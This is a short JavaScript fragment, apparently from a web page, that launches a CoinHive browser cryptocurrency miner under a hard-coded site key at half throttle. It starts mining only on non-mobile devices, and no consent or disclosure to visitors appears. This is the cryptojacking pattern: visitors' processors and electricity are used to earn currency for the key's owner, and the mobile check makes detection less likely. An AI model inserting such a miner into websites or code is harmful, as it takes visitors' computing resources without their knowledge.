    let miner = new CoinHive.Anonymous('QbgpjAPTac4TDxpWZto4zId8XNCiISZo', {throttle: 0.5});

    // Only start on non-mobile devices
    if (!miner.isMobile()) {
        miner.start();
    }

